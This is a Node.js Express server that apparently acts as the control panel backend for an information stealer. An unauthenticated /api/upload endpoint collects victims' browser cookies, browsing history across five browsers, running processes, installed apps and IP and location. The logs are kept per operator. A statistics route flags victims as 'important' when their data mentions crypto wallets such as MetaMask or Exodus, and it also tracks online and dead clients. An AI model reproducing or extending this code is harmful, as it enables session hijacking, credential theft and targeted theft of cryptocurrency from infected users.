require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const { userDb, loginAttemptsDb, logsDb } = require('./database');

const app = express();
const PORT = process.env.PORT || 3001;

// JWT_SECRET must be set in environment variables - no hardcoded fallback
if (!process.env.JWT_SECRET) {
    console.error('ERROR: JWT_SECRET environment variable is required!');
    console.error('Please set JWT_SECRET in your .env file.');
    console.error('Generate one with: node -e "console.log(require(\'crypto\').randomBytes(64).toString(\'hex\'))"');
    process.exit(1);
}
const JWT_SECRET = process.env.JWT_SECRET;

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

// Helper function to get client IP
const getClientIp = (req) => {
    return req.headers['x-forwarded-for']?.split(',')[0] || 
           req.headers['x-real-ip'] || 
           req.connection.remoteAddress || 
           req.socket.remoteAddress || 
           'Unknown';
};

// Authentication middleware
const authenticateToken = (req, res, next) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1]; // Bearer TOKEN

    if (!token) {
        return res.status(401).json({ message: 'Access token required' });
    }

    jwt.verify(token, JWT_SECRET, (err, user) => {
        if (err) {
            return res.status(403).json({ message: 'Invalid or expired token' });
        }
        req.user = user;
        next();
    });
};

// API Endpoints

// Authentication endpoint
app.post('/api/auth/login', (req, res) => {
    try {
        const { username, password } = req.body;
        const ipAddress = getClientIp(req);
        const userAgent = req.headers['user-agent'] || 'Unknown';

        if (!username || !password) {
            loginAttemptsDb.create(username || 'unknown', ipAddress, false, userAgent);
            return res.status(400).json({ message: 'Username and password are required' });
        }

        // Find user in database
        const user = userDb.findByUsername(username);

        if (!user) {
            loginAttemptsDb.create(username, ipAddress, false, userAgent);
            return res.status(401).json({ message: 'Invalid username or password' });
        }

        // Verify password
        const passwordValid = bcrypt.compareSync(password, user.password_hash);
        
        if (!passwordValid) {
            loginAttemptsDb.create(username, ipAddress, false, userAgent);
            return res.status(401).json({ message: 'Invalid username or password' });
        }

        // Log successful login attempt
        loginAttemptsDb.create(username, ipAddress, true, userAgent);
        userDb.updateLastLogin(username);

        // Generate JWT token
        const token = jwt.sign(
            { username: user.username, id: user.id },
            JWT_SECRET,
            { expiresIn: '24h' }
        );
        
        console.log(`User ${username} logged in successfully from ${ipAddress} at ${new Date().toISOString()}`);

        res.json({
            success: true,
            token: token,
            username: username,
            message: 'Login successful'
        });
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({ message: 'Internal server error' });
    }
});

// Logout endpoint
app.post('/api/auth/logout', authenticateToken, (req, res) => {
    res.json({ success: true, message: 'Logged out successfully' });
});

// Get login history
app.get('/api/auth/login-history', authenticateToken, (req, res) => {
    try {
        const limit = parseInt(req.query.limit) || 100;
        const history = loginAttemptsDb.getAll(limit);
        res.json(history);
    } catch (error) {
        console.error('Error fetching login history:', error);
        res.status(500).json({ message: 'Internal server error' });
    }
});

// User management endpoints (protected)
app.post('/api/auth/register', authenticateToken, (req, res) => {
    try {
        const { username, password } = req.body;

        if (!username || !password) {
            return res.status(400).json({ message: 'Username and password are required' });
        }

        if (password.length < 6) {
            return res.status(400).json({ message: 'Password must be at least 6 characters' });
        }

        // Hash password and create user
        const passwordHash = bcrypt.hashSync(password, 10);
        
        try {
            const newUser = userDb.create(username, passwordHash);
            console.log(`New user created: ${username}`);
            res.json({ success: true, message: 'User created successfully', user: newUser });
        } catch (error) {
            if (error.message === 'Username already exists') {
                return res.status(400).json({ message: 'Username already exists' });
            }
            throw error;
        }
    } catch (error) {
        console.error('Registration error:', error);
        res.status(500).json({ message: 'Internal server error' });
    }
});

app.post('/api/auth/change-password', authenticateToken, (req, res) => {
    try {
        const { oldPassword, newPassword } = req.body;
        const username = req.user.username;

        if (!oldPassword || !newPassword) {
            return res.status(400).json({ message: 'Old password and new password are required' });
        }

        if (newPassword.length < 6) {
            return res.status(400).json({ message: 'New password must be at least 6 characters' });
        }

        const user = userDb.findByUsername(username);

        if (!user) {
            return res.status(404).json({ message: 'User not found' });
        }

        // Verify old password
        if (!bcrypt.compareSync(oldPassword, user.password_hash)) {
            return res.status(401).json({ message: 'Incorrect old password' });
        }

        // Update password
        const passwordHash = bcrypt.hashSync(newPassword, 10);
        userDb.updatePassword(username, passwordHash);

        console.log(`Password changed for user: ${username}`);
        res.json({ success: true, message: 'Password changed successfully' });
    } catch (error) {
        console.error('Change password error:', error);
        res.status(500).json({ message: 'Internal server error' });
    }
});

// Get all users (admin only)
app.get('/api/auth/users', authenticateToken, (req, res) => {
    try {
        const users = userDb.getAll();
        // Don't send password hashes to client
        const safeUsers = users.map(user => ({
            id: user.id,
            username: user.username,
            created_at: user.created_at,
            last_login: user.last_login,
            is_active: user.is_active
        }));
        res.json(safeUsers);
    } catch (error) {
        console.error('Error fetching users:', error);
        res.status(500).json({ message: 'Internal server error' });
    }
});

// Delete user (admin only)
app.delete('/api/auth/users/:username', authenticateToken, (req, res) => {
    try {
        const { username } = req.params;
        const currentUser = req.user.username;
        
        // Prevent self-deletion
        if (username === currentUser) {
            return res.status(400).json({ message: 'Cannot delete your own account' });
        }
        
        const user = userDb.findByUsername(username);
        if (!user) {
            return res.status(404).json({ message: 'User not found' });
        }
        
        const { db } = require('./database');
        db.prepare('DELETE FROM users WHERE username = ?').run(username);
        
        console.log(`User ${username} deleted by ${currentUser}`);
        res.json({ success: true, message: 'User deleted successfully' });
    } catch (error) {
        console.error('Error deleting user:', error);
        res.status(500).json({ message: 'Internal server error' });
    }
});

// Deactivate/Activate user (admin only)
app.patch('/api/auth/users/:username', authenticateToken, (req, res) => {
    try {
        const { username } = req.params;
        const { is_active } = req.body;
        
        if (typeof is_active !== 'boolean') {
            return res.status(400).json({ message: 'is_active must be a boolean' });
        }
        
        const user = userDb.findByUsername(username);
        if (!user) {
            return res.status(404).json({ message: 'User not found' });
        }
        
        const { db } = require('./database');
        db.prepare('UPDATE users SET is_active = ? WHERE username = ?').run(is_active ? 1 : 0, username);
        
        console.log(`User ${username} ${is_active ? 'activated' : 'deactivated'} by ${req.user.username}`);
        res.json({ success: true, message: `User ${is_active ? 'activated' : 'deactivated'} successfully` });
    } catch (error) {
        console.error('Error updating user:', error);
        res.status(500).json({ message: 'Internal server error' });
    }
});

// Reset password (admin only - no old password required)
app.post('/api/auth/reset-password', authenticateToken, (req, res) => {
    try {
        const { username, newPassword } = req.body;
        
        if (!username || !newPassword) {
            return res.status(400).json({ message: 'Username and new password are required' });
        }
        
        if (newPassword.length < 6) {
            return res.status(400).json({ message: 'New password must be at least 6 characters' });
        }
        
        const user = userDb.findByUsername(username);
        if (!user) {
            return res.status(404).json({ message: 'User not found' });
        }
        
        // Hash new password with bcrypt (includes automatic salting)
        const passwordHash = bcrypt.hashSync(newPassword, 10);
        userDb.updatePassword(username, passwordHash);
        
        console.log(`Password reset for user ${username} by ${req.user.username}`);
        res.json({ success: true, message: 'Password reset successfully' });
    } catch (error) {
        console.error('Error resetting password:', error);
        res.status(500).json({ message: 'Internal server error' });
    }
});

// Logs endpoints
app.get('/api/logs', authenticateToken, (req, res) => {
    try {
        const username = req.user.username;
        
        // Filter logs by the logged-in user's username
        // Each log has a "user" field that matches the client's user identifier
        let logs = logsDb.getAll();
        
        // Filter logs by username - only show logs where log.user matches the logged-in username
        // If a log has no user field (old logs), show them to "account" user for backward compatibility
        logs = logs.filter(log => {
            // If log has no user field or user is null/empty, show it only to "account" user (for backward compatibility)
            const logUser = log.user;
            if (!logUser || logUser === null || logUser === '' || logUser === undefined) {
                return username === 'account';
            }
            // Show log if user matches
            return logUser === username;
        });
        
        console.log(`Filtered logs for user ${username}: ${logs.length} logs found (from ${logsDb.getAll().length} total)`);
        
        res.json(logs);
    } catch (error) {
        console.error('Error fetching logs:', error);
        res.status(500).json({ message: 'Internal server error' });
    }
});

app.post('/api/upload', (req, res) => {
    try {
        const sessionId = req.headers['x-session-id'] || null;
        const pcData = req.body;
        const ip = pcData.ipAddress || 'Unknown';
        const country = pcData.location?.countryName || 'Unknown';
        const dateTime = pcData.dateTime || new Date().toISOString();

        // Generate consistent log ID based on session ID or timestamp
        const logId = sessionId ? `log-${sessionId}` : `log-${Date.now()}-${Math.floor(Math.random() * 1000)}`;

        // Data transformation for browserCookies
        let transformedBrowserCookies = [];
        if (pcData && pcData.browserCookies && typeof pcData.browserCookies === 'string') {
            try {
                transformedBrowserCookies = JSON.parse(pcData.browserCookies);
            } catch (parseError) {
                console.error("Error parsing browserCookies string:", parseError);
                transformedBrowserCookies = [];
            }
        } else if (pcData && pcData.browserCookies) {
            transformedBrowserCookies = pcData.browserCookies;
        }

        // Calculate dataSummary from current chunk
        // Note: For updates, the summary will be recalculated from merged data in database.js
        let totalHistoryEntries = 0;
        if (pcData && pcData.browserHistory) {
            totalHistoryEntries += pcData.browserHistory.chromeHistory?.length || 0;
            totalHistoryEntries += pcData.browserHistory.firefoxHistory?.length || 0;
            totalHistoryEntries += pcData.browserHistory.edgeHistory?.length || 0;
            totalHistoryEntries += pcData.browserHistory.operaHistory?.length || 0;
            totalHistoryEntries += pcData.browserHistory.braveHistory?.length || 0;
        }

        const dataSummary = {
            historyEntries: totalHistoryEntries,
            processes: pcData?.runningProcesses?.length || 0,
            installedApps: pcData?.installedApps?.length || 0,
            cookies: transformedBrowserCookies.length || 0
        };

        // Only include browserCookies in pcData if we actually have cookies in this chunk
        // This prevents overwriting existing cookies with empty arrays from later chunks
        const pcDataToStore = { ...pcData };
        
        // Always preserve browserCookies if they exist in the incoming data
        if (pcData.browserCookies !== undefined && pcData.browserCookies !== null) {
            if (transformedBrowserCookies.length > 0) {
                // We have parsed cookies - use them
                pcDataToStore.browserCookies = transformedBrowserCookies;
            } else if (typeof pcData.browserCookies === 'string' && pcData.browserCookies.length > 0) {
                // Keep the original string if parsing failed but string exists
                pcDataToStore.browserCookies = pcData.browserCookies;
            } else if (Array.isArray(pcData.browserCookies) && pcData.browserCookies.length > 0) {
                // Keep the array if it exists
                pcDataToStore.browserCookies = pcData.browserCookies;
            }
            // If browserCookies is null/empty, we still include it so merge logic knows to update
        }
        // If browserCookies is not in pcData at all, don't include it (allows merge to preserve existing)
        
        // Extract user from pcData
        const user = pcData?.user || null;
        
        const logData = {
            id: logId,
            sessionId: sessionId,
            ip: ip,
            country: country,
            date: dateTime,
            dataSummary,
            pcData: pcDataToStore,
            user: user,
        };

        // Use createOrUpdate to merge chunks
        const savedLogId = logsDb.createOrUpdate(logData);
        
        if (sessionId) {
            console.log(`Log chunk received and merged: ${savedLogId} (session: ${sessionId}) from ${ip}`);
        } else {
            console.log(`Log saved: ${savedLogId} from ${ip}`);
        }

        res.status(200).send('Log received and saved');
    } catch (error) {
        console.error("Error processing uploaded log:", error);
        console.error("Error stack:", error.stack);
        res.status(500).json({ 
            message: 'Error processing log',
            error: error.message 
        });
    }
});

app.get('/api/logs/:logId', (req, res) => {
    try {
        const { logId } = req.params;
        const log = logsDb.getById(logId);
        if (log) {
            res.json(log);
        } else {
            res.status(404).send('Log not found');
        }
    } catch (error) {
        console.error('Error fetching log:', error);
        res.status(500).json({ message: 'Internal server error' });
    }
});

app.post('/api/logs/delete', authenticateToken, (req, res) => {
    try {
        const username = req.user.username;
        
        // Only allow "account" user to delete logs
        if (username !== 'account') {
            return res.status(403).json({ message: 'Only account user can delete logs' });
        }
        
        const { logIds } = req.body;
        if (!Array.isArray(logIds)) {
            return res.status(400).send('logIds must be an array');
        }

        const deletedCount = logsDb.deleteByIds(logIds);

        if (deletedCount > 0) {
            res.status(200).json({ message: `Deleted ${deletedCount} log(s)`, deletedCount });
        } else {
            res.status(404).send('No logs found to delete');
        }
    } catch (error) {
        console.error("Error deleting logs:", error);
        res.status(500).send('Error deleting logs');
    }
});

app.get('/api/stats', (req, res) => {
    try {
        const stats = logsDb.getStats();
        res.json(stats);
    } catch (error) {
        console.error('Error fetching stats:', error);
        res.status(500).json({ message: 'Internal server error' });
    }
});

app.get('/api/statistics', (req, res) => {
    console.log('Statistics endpoint hit!');
    try {
        const logs = logsDb.getAll();
        const totalLogs = logs.length;
        
        // Calculate country distribution
        const countryCounts = {};
        logs.forEach(log => {
            const country = log.country || 'Unknown';
            countryCounts[country] = (countryCounts[country] || 0) + 1;
        });
        
        // Sort countries by count
        const countryDistribution = Object.entries(countryCounts)
            .map(([country, count]) => ({ country, count }))
            .sort((a, b) => b.count - a.count);

        // Calculate log trends (last 30 days)
        const thirtyDaysAgo = new Date(Date.now() - 30 * 24 * 60 * 60 * 1000);
        const dailyLogs = {};
        
        logs.forEach(log => {
            const logDate = new Date(log.date);
            if (logDate >= thirtyDaysAgo) {
                const dateKey = logDate.toISOString().split('T')[0];
                dailyLogs[dateKey] = (dailyLogs[dateKey] || 0) + 1;
            }
        });

        // Create array of daily log counts for last 30 days
        const last30Days = [];
        for (let i = 29; i >= 0; i--) {
            const date = new Date();
            date.setDate(date.getDate() - i);
            const dateKey = date.toISOString().split('T')[0];
            last30Days.push({
                date: dateKey,
                count: dailyLogs[dateKey] || 0
            });
        }

        // Calculate important logs (logs with crypto-related data)
        const cryptoKeywords = ['crypto', 'bitcoin', 'wallet', 'exodus', 'electrum', 'coinbase', 'metamask', 'binance'];
        let importantLogs = 0;
        let regularLogs = 0;

        logs.forEach(log => {
            const hasCrypto = log.pcData && (
                (log.pcData.browserHistory && JSON.stringify(log.pcData.browserHistory).toLowerCase().match(cryptoKeywords.join('|'))) ||
                (log.pcData.browserCookies && JSON.stringify(log.pcData.browserCookies).toLowerCase().match(cryptoKeywords.join('|'))) ||
                (log.pcData.installedApps && log.pcData.installedApps.some(app => 
                    cryptoKeywords.some(keyword => app.name.toLowerCase().includes(keyword))
                ))
            );
            
            if (hasCrypto) {
                importantLogs++;
            } else {
                regularLogs++;
            }
        });

        // Calculate totals for different data types
        let totalHistoryEntries = 0;
        let totalCookies = 0;
        let totalProcesses = 0;
        let totalApps = 0;

        logs.forEach(log => {
            if (log.dataSummary) {
                totalHistoryEntries += log.dataSummary.historyEntries || 0;
                totalCookies += log.dataSummary.cookies || 0;
                totalProcesses += log.dataSummary.processes || 0;
                totalApps += log.dataSummary.installedApps || 0;
            }
        });

        const stats = logsDb.getStats();

        res.json({
            totalLogs,
            allClients: stats.allClients,
            onlineClients: stats.onlineClients,
            deadClients: stats.deadClients,
            countryDistribution,
            last30Days,
            importantLogs,
            regularLogs,
            totals: {
                historyEntries: totalHistoryEntries,
                cookies: totalCookies,
                processes: totalProcesses,
                apps: totalApps
            }
        });
    } catch (error) {
        console.error("Error calculating statistics:", error);
        res.status(500).send('Error calculating statistics');
    }
});

app.get('/api/download/:logId', (req, res) => {
    try {
        const { logId } = req.params;
        const log = logsDb.getById(logId);
        if (log) {
            res.setHeader('Content-Type', 'application/zip');
            res.setHeader('Content-Disposition', `attachment; filename=${logId}_data.zip`);
            res.send(`Dummy ZIP content for log ${logId}`);
        } else {
            res.status(404).send('Log not found for download');
        }
    } catch (error) {
        console.error('Error downloading log:', error);
        res.status(500).json({ message: 'Internal server error' });
    }
});

// Serve static files from the React app (AFTER API routes)
app.use(express.static(path.join(__dirname, 'client/build')));

// Handle React routing, return all requests to React app
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'client/build', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`Server listening on 0.0.0.0:${PORT} (accessible from all interfaces)`);
    console.log(`Database initialized and ready`);
});
